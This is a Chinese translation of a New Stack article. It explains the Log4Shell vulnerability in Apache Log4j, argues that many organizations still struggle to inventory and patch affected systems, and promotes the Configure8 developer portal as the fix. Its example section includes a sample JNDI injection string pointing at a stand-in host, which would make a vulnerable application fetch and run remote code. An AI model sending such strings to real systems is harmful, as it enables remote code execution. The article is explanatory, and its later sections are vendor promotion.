# Log4j:组织未能补救此风险的原因

> 原文：<https://thenewstack.io/log4j-why-organizations-are-failing-to-remediate-this-risk/>

每年，安全研究人员[都会发现更多的软件漏洞](https://www.techrepublic.com/article/2021-marks-another-record-year-for-security-vulnerabilities/)，但有一个安全问题脱颖而出: [Log4j 的 Log4Shell 漏洞](https://venturebeat.com/security/csrb-log4j/)。2021 年 12 月，当研究人员在 Apache Log4j 库中发现一个远程代码执行漏洞时，很明显，数十亿使用 [Java](https://venturebeat.com/commerce/for-less-than-20-you-can-learn-the-ins-and-outs-of-java-programming/) 的设备面临风险。

关于 Log4j 的大部分喧嚣已经平息，但这并不意味着威胁已经过去。许多组织仍在努力消除这个漏洞。事实上，许多人仍然在发现他们仍然脆弱的过程中。与 1 月份相比，21%的具有易受攻击系统的组织报告 7 月份易受 Log4j 攻击的资产数量出现了三位数的百分比增长。

## **Log4j 是什么？**

Log4j 是一个应用程序日志库。应用程序记录诊断或错误消息等事件，用于故障排除和审计目的。

例如，许多微服务应用程序记录它们从用户那里收到的请求信息。这些日志为操作员、管理员和开发人员提供了有关服务使用方式和错误所在的重要信息。Log4j 最受欢迎的功能之一是一个健壮的变量系统，它使开发人员可以轻松地向日志消息添加动态信息。这也是远程执行漏洞所在的位置。

## **Log4j 漏洞是什么？**

2021 年 12 月， [NIST 公布了 Log4 中的漏洞 CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) ，俗称 Log4Shell。

Log4j 最强大的特性之一是它能够执行[查找](https://logging.apache.org/log4j/2.x/manual/lookups.html)，用运行时信息替换特殊格式的字符串。最基本的查找示例是事件的时间和生成事件的 Java 类。

查找的更高级用途包括使用 Java 命名和目录接口(JNDI)的环境变量或操作。)这些机制允许开发人员(和攻击者)到达应用程序之外，收集有关程序环境的信息或下载代码。

例如，Log4 可以转换这个日志消息:

```
logger.info("Received request in ${docker:containerName}");

```

通过用运行代码的 docker 容器替换变量**$ { Docker:container name }【T2:** 

```
10-19-2022  09:30:24  Received request in weblogic24

```

前缀 **docker** 告诉 Log4j 在 docker 中查找 **containerName** 属性。

## **一个 Log4Shell 示例**

查找是一个有用的特性，如果日志系统不能用运行时信息来丰富日志消息，那么它将几乎毫无用处。但是查找的两个属性使得 Log4Shell 攻击非常危险:

*   Log4j 处理日志消息中的所有变量，即使它们来自用户输入。
*   JNDI 让变量离开程序边界去寻找一个值成为可能，包括开放的互联网。换句话说，攻击者可以利用 JNDI 强迫程序下载恶意代码。

> 查找是一个有用的特性，如果日志系统不能用运行时信息来丰富日志消息，那么它将几乎毫无用处。

JNDI 的一个良性例子是这样的:

```
logger.debug  ("User under test: ${jndi :ldap://localhost:8080/o=UserObjectID}")

```

该日志消息将向运行在 **localhost** 上的服务请求一个用户对象，并执行它。在本例中，开发人员为用户对象创建了 URL，并将其指向一个受信任的系统。

但是当用户注入一个不可信的 URL 时会发生什么呢？

假设一个攻击者试图用一个恶意 JDNI 地址的用户名登录一个系统。登录失败，但是简单的目标应用程序将字符串传递给 Log4j:

```
logger.error("User login failed. Username: ${jndi :ldap://example.com:8080/maliciouscode} is not valid")

```

利用漏洞，应用下载有效载荷并执行。

即使攻击者不使用 JNDI 来攻击系统，他们仍然可以在请求中嵌入变量，欺骗应用程序记录有关其主机系统和环境的信息。这与不安全存储的日志文件相结合，可以为他们提供有关目标系统的信息。

Log4j 漏洞使得攻击者能够强迫应用程序运行恶意代码或记录机密信息。

## **为什么它仍然是一种威胁？**

由于其强大的功能和出色的性能，自 21 世纪初以来，封闭和开放源代码应用程序已经在其应用程序中嵌入了 Log4j 库。解决漏洞需要发现使用它的应用程序。然后，您必须从开发人员那里获得更新，或者手动替换 Log4j 库，并验证代码仍然工作。

Log4j 的普遍性使得这个过程的第一部分非常困难。对易受影响的应用程序和设备进行定位和分类是一项繁重的工作，许多公司没有完成这项工作所需的工具。

## **解决 Log4j 漏洞的最佳方法是什么？**

解决任何问题的第一步是规划，在这种情况下，规划必须包括发现需要用库的安全版本或不同的日志框架更新的应用程序和服务。虽然这似乎是一个显而易见的步骤，但许多公司在项目一开始就失败了。他们的努力还没开始就注定要失败。

当被问及如何缓解 Log4j 问题时，Forrester 的高级安全运营分析师 Allie Mellen 告诉 [Venture Beat](https://venturebeat.com/security/csrb-log4j/) “如果没有该功能在何处使用的准确清单，就很难跟踪它在企业中使用的每一个应用程序。

因此，从收集使用 Log4j 的应用程序清单开始。一旦您收集了这些信息，您就可以找到或指定一个所有者，并确保他们拥有缓解问题的资源。但是，收集库存很容易描述，但很难完成。您可能会想到一组包含应用程序信息的电子表格，以及一系列与保持它们最新相关的令人头痛的问题。幸运的是，有更好的工具。

## **内部开发者门户来救援**

管理大型补救流程需要围绕通用目录构建内部开发人员门户。这种类型的解决方案使您能够在一个地方组织所有的应用程序、服务、环境、云资源和关于它们的关键信息，如所有者、安装依赖项和安全漏洞。借助高级分析和记分卡，您可以衡量和管理团队修复漏洞的进度。

> 管理大型补救流程需要一个围绕通用目录构建的内部开发人员门户来跟踪服务。

[Configure8](https://www.configure8.io/) 提供了一系列全面的关键集成来帮助团队发现和解决 Log4j 问题，包括跨亚马逊网络服务(AWS)、Azure 和谷歌云平台(GCP)的云资源、存储库提供商和安全工具集成，以及可以在您的分布式系统的这个活知识地图上运行的不断扩展的分析套件。有了这样的解决方案，您可以快速映射您的系统，确定漏洞和负责补救的各方，并组织和跟踪一项计划来解决您组织中剩余的 Log4j 漏洞。

## **结论**

Log4j 漏洞仍然是许多公司面临的一个重大问题。一个主要原因是因为 Log4j 的普遍性使得公司很难识别受该问题影响的服务和系统。公司需要准确的服务清单，包括软件版本、安全状态、团队所有权、部署和其他相关信息。

但是存储在电子表格或任何其他人工输入系统中的库存只是另一个维护问题。补救像 Log4j 这样的大规模服务问题需要一个动态的系统清单，该清单可以快速装载数据，并为您提供有关服务状态的高级可视化和分析。

Configure8 拥有管理 Log4j 等大规模补救所需的工具。它为您提供了快速构建服务和资源目录的工具，然后深入了解各个组件及其依赖关系的信息。从那里，你就有了开始和跟踪你的努力所需要的所有工具。

<svg xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 68 31" version="1.1"><title>Group</title> <desc>Created with Sketch.</desc></svg>